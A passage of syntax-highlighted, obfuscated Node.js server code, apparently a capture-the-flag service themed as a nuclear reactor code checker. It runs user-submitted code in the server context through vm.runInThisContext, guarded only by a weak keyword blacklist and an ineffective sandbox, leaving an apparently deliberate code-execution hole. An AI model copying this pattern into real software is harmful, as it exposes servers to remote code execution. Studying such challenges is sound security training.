</span><span class="line">    <span class="nx">b</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">    <span class="nx">b</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">k</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">makeSandbox</span><span class="p">()</span> <span class="p">{</span>
</span><span class="line">  <span class="k">delete</span>  <span class="nb">eval</span><span class="p">;</span>
</span><span class="line">  <span class="k">delete</span>  <span class="nb">Function</span><span class="p">;</span>
</span><span class="line">  <span class="k">delete</span>  <span class="nx">require</span><span class="p">;</span>
</span><span class="line">  <span class="k">delete</span>  <span class="nx">fs</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">V</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;81&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;No password found&quot;</span> <span class="o">:</span> <span class="s2">&quot;token&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;c14&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;match&quot;</span> <span class="o">:</span> <span class="s2">&quot;toString&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;5f&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;eval&quot;</span> <span class="o">:</span> <span class="s2">&quot;readFileSync&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;ffb7&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span> <span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">s4</span><span class="p">,</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;fb&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;Your code has runtime errors: &#39;</span> <span class="o">:</span> <span class="nx">b</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">J4</span> <span class="o">+</span> <span class="nx">k</span><span class="p">;</span>
</span><span class="line">  <span class="k">try</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;67cf&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;Code contains unsafe functionality.\n&quot;</span> <span class="o">:</span> <span class="nx">ff</span><span class="p">[</span><span class="nx">c</span><span class="p">](</span><span class="nx">w</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">x2</span> <span class="o">+</span> <span class="nx">z</span><span class="p">)[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">w4</span><span class="p">]();</span>
</span><span class="line">    <span class="k">return</span> <span class="nx">O</span><span class="p">[</span><span class="nx">s</span><span class="p">](</span><span class="sr">/password = &quot;([0-9a-zA-Z]{16})&quot;/</span><span class="p">)[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">y2</span><span class="p">];</span>
</span><span class="line">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="p">;</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">  <span class="k">return</span> <span class="nx">V</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;1b&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;k&quot;</span> <span class="o">:</span> <span class="s2">&quot;runInThisContext&quot;</span><span class="p">,</span> <span class="nx">V</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;81e&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;vm&quot;</span> <span class="o">:</span> <span class="s2">&quot;handlePOST&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;74&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">global</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;a11a&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;g&quot;</span> <span class="o">:</span> <span class="nx">E</span><span class="p">;</span>
</span><span class="line">  <span class="p">}</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;33c1&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">password</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;77&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;loadSubmission&quot;</span> <span class="o">:</span> <span class="nx">E</span><span class="p">;</span>
</span><span class="line">  <span class="p">}</span> <span class="o">:</span> <span class="s2">&quot;submissions&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;d5&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;retval&quot;</span> <span class="o">:</span> <span class="nx">require</span><span class="p">(</span><span class="nx">V</span><span class="p">);</span>
</span><span class="line">  <span class="nx">c</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">l2</span><span class="p">);</span>
</span><span class="line">  <span class="nx">s</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">l2</span><span class="p">);</span>
</span><span class="line">  <span class="nx">w</span><span class="p">[</span><span class="nx">k</span><span class="p">](</span><span class="nx">b</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">w4</span><span class="p">]());</span>
</span><span class="line">  <span class="k">return</span> <span class="nx">password</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">V</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;ac&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;handle&quot;</span> <span class="o">:</span> <span class="s2">&quot;writeFileSync&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;3a8&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;mkdirSync&quot;</span> <span class="o">:</span> <span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;6ef&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;statSync&quot;</span> <span class="o">:</span> <span class="s2">&quot;err&quot;</span><span class="p">,</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">s4</span><span class="p">,</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">b</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">J4</span> <span class="o">+</span> <span class="nx">k</span><span class="p">;</span>
</span><span class="line">  <span class="k">try</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">Z</span> <span class="o">=</span> <span class="nx">ff</span><span class="p">[</span><span class="nx">w</span><span class="p">](</span><span class="nx">z</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="p">;</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Z</span><span class="p">)</span><span class="nx">ff</span><span class="p">[</span><span class="nx">c</span><span class="p">](</span><span class="nx">z</span><span class="p">);</span>
</span><span class="line">  <span class="nx">ff</span><span class="p">[</span><span class="nx">s</span><span class="p">](</span><span class="nx">z</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">x2</span> <span class="o">+</span> <span class="nx">O</span><span class="p">,</span> <span class="nx">V</span><span class="p">);</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">checkCode</span><span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;61&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="s2">&quot;res&quot;</span><span class="p">,</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;2f7&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;test&quot;</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">V</span> <span class="o">=</span> <span class="s2">&quot;test&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;3ae&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="mi">30</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mf">96.5E1</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;R&#39;</span> <span class="o">:</span> <span class="p">(</span><span class="mf">105.2E1</span><span class="p">,</span> <span class="mi">44</span><span class="p">.)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">142</span><span class="p">,</span> <span class="mf">1.183E3</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">110</span><span class="p">,</span> <span class="mf">133.70E1</span><span class="p">)</span> <span class="o">:</span> <span class="mi">120</span><span class="p">.</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">53.6E1</span><span class="p">,</span> <span class="mi">96</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x24A</span><span class="p">,</span> <span class="s2">&quot;q&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">8.4E1</span><span class="p">,</span> <span class="mf">1.5E1</span><span class="p">))</span> <span class="o">:</span> <span class="s2">&quot;writeFileSync&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;ba&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="mf">9.99E2</span><span class="p">,</span> <span class="mf">119.80E1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mi">24</span><span class="p">.,</span> <span class="mf">10.96E2</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;\n&#39;</span> <span class="o">:</span> <span class="mi">131</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mh">0x105</span><span class="p">,</span> <span class="mh">0x132</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;\n&#39;</span> <span class="o">:</span> <span class="p">(</span><span class="mf">1.0010E3</span><span class="p">,</span> <span class="mi">72</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">23.90E1</span> <span class="o">?</span> <span class="p">(</span><span class="mi">124</span><span class="p">.,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">100</span><span class="p">.,</span> <span class="mh">0x254</span><span class="p">))</span> <span class="o">:</span> <span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="p">[</span><span class="sr">/eval/</span><span class="p">,</span> <span class="sr">/global/</span><span class="p">,</span> <span class="sr">/Function/</span><span class="p">,</span> <span class="sr">/this/</span><span class="p">];</span>
</span><span class="line">  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">c</span><span class="p">;</span> <span class="nx">A3a</span><span class="p">[</span><span class="nx">s</span><span class="p">](</span><span class="nx">z</span><span class="p">,</span> <span class="nx">w</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">p2</span><span class="p">]);</span> <span class="nx">z</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nx">w</span><span class="p">[</span><span class="nx">z</span><span class="p">][</span><span class="nx">V</span><span class="p">](</span><span class="nx">E</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">      <span class="k">return</span> <span class="nx">k</span><span class="p">;</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">  <span class="k">return</span> <span class="nx">b</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">G</span><span class="p">,</span> <span class="nx">A</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">N</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;e1c&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;data&quot;</span> <span class="o">:</span> <span class="s2">&quot;hasOwnProperty&quot;</span><span class="p">;</span>
</span><span class="line">  <span class="nx">G</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">t2</span><span class="p">](</span><span class="nx">N</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">V</span> <span class="o">=</span> <span class="s1">&#39;Your JSON is malformed. Please provide the following properties: flag_id, token, code\n&#39;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="s1">&#39;Code contains unsafe functionality.\n&#39;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;46cf&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is &quot;password&quot;.\n&#39;</span> <span class="o">:</span> <span class="s2">&quot;Received: %s&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;53&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;text/plain&#39;</span> <span class="o">:</span> <span class="s1">&#39;Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n&#39;</span><span class="p">,</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;555&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;U&quot;</span> <span class="o">:</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;8ccd&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;\n&#39;</span> <span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">Z</span> <span class="o">=</span> <span class="s1">&#39;Your password: &#39;</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="s2">&quot;code&quot;</span><span class="p">,</span> <span class="nx">T</span> <span class="o">=</span> <span class="s2">&quot;token&quot;</span><span class="p">,</span> <span class="nx">D</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;2235&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;e&quot;</span> <span class="o">:</span> <span class="s2">&quot;flag_id&quot;</span><span class="p">,</span> <span class="nx">J</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;8f&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;hasOwnProperty&quot;</span> <span class="o">:</span> <span class="s2">&quot;hasOwnProperty&quot;</span><span class="p">,</span> <span class="nx">R</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;2fb&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;patterns&quot;</span> <span class="o">:</span> <span class="s2">&quot;parse&quot;</span><span class="p">;</span>
</span><span class="line">    <span class="k">try</span> <span class="p">{</span>
</span><span class="line">      <span class="nx">data_json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">[</span><span class="nx">R</span><span class="p">](</span><span class="nx">k</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">data_json</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;265&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">{}</span> <span class="o">:</span> <span class="p">((</span><span class="mh">0x17B</span><span class="p">,</span> <span class="mi">149</span><span class="p">.)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">30</span><span class="p">.,</span> <span class="mh">0x20F</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">12.17E2</span><span class="p">,</span> <span class="s2">&quot;vm&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">7.79E2</span><span class="p">,</span> <span class="mi">128</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0x1A6</span> <span class="o">?</span> <span class="p">(</span><span class="mf">21.90E1</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">57</span><span class="p">.,</span> <span class="mi">53</span><span class="p">.)</span> <span class="o">&gt;</span> <span class="mf">106.7E1</span> <span class="o">?</span> <span class="p">(</span><span class="mf">7.26E2</span><span class="p">,</span> <span class="mi">84</span><span class="p">.)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">11.61E2</span><span class="p">,</span> <span class="mf">1.5E2</span><span class="p">));</span>
</span><span class="line">      <span class="p">};</span>
</span><span class="line">      <span class="nx">b</span><span class="p">();</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">J</span><span class="p">](</span><span class="nx">D</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">data_json</span><span class="p">[</span><span class="nx">J</span><span class="p">](</span><span class="nx">T</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">J</span><span class="p">](</span><span class="nx">e</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">old_password</span> <span class="o">=</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">D</span><span class="p">],</span> <span class="nx">data_json</span><span class="p">[</span><span class="nx">T</span><span class="p">]);</span>
</span><span class="line">        <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">        <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">Z</span> <span class="o">+</span> <span class="nx">old_password</span> <span class="o">+</span> <span class="nx">O</span><span class="p">);</span>
</span><span class="line">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">        <span class="kd">var</span> <span class="nx">W</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;d6b7&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">          <span class="nx">code</span> <span class="o">=</span> <span class="nx">E</span><span class="p">[</span><span class="nx">e</span><span class="p">];</span>
</span><span class="line">        <span class="p">}</span> <span class="o">:</span> <span class="s2">&quot;No password found&quot;</span><span class="p">,</span> <span class="nx">B</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">          <span class="nx">password</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;5c78&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;retval&quot;</span> <span class="o">:</span> <span class="nx">E</span><span class="p">;</span>
</span><span class="line">        <span class="p">};</span>
</span><span class="line">        <span class="nx">B</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">l2</span><span class="p">);</span>
</span><span class="line">        <span class="nx">W</span><span class="p">(</span><span class="nx">data_json</span><span class="p">);</span>
</span><span class="line">        <span class="k">if</span> <span class="p">(</span><span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">          <span class="k">try</span> <span class="p">{</span>
</span><span class="line">            <span class="nx">retval</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;c4&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;Server running at http://0.0.0.0:1337/&quot;</span> <span class="o">:</span> <span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">w4</span><span class="p">]());</span>
</span><span class="line">          <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">            <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;b38a&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;Your password: &quot;</span> <span class="o">:</span> <span class="s1">&#39;Your code has runtime errors: &#39;</span><span class="p">;</span>
</span><span class="line">            <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">            <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">b</span> <span class="o">+</span> <span class="nx">E</span> <span class="o">+</span> <span class="nx">O</span><span class="p">);</span>
</span><span class="line">          <span class="p">}</span>
</span><span class="line">          <span class="k">try</span> <span class="p">{</span>
</span><span class="line">            <span class="k">if</span> <span class="p">(</span><span class="nx">A3a</span><span class="p">[</span><span class="nx">z</span><span class="p">](</span><span class="nx">password</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">p2</span><span class="p">],</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">y2</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">              <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">D</span><span class="p">],</span> <span class="nx">data_json</span><span class="p">[</span><span class="nx">T</span><span class="p">],</span> <span class="nx">code</span><span class="p">);</span>
</span><span class="line">              <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">              <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">w</span><span class="p">);</span>
</span><span class="line">            <span class="p">}</span>
</span><span class="line">          <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">            <span class="nx">console</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">R4</span><span class="p">](</span><span class="nx">E</span><span class="p">);</span>
</span><span class="line">          <span class="p">}</span>
</span><span class="line">          <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">          <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">c</span><span class="p">);</span>
</span><span class="line">        <span class="p">}</span>
</span><span class="line">      <span class="p">}</span>
</span><span class="line">      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">s</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">V</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">  <span class="p">});</span>
</span><span class="line"><span class="p">}</span>
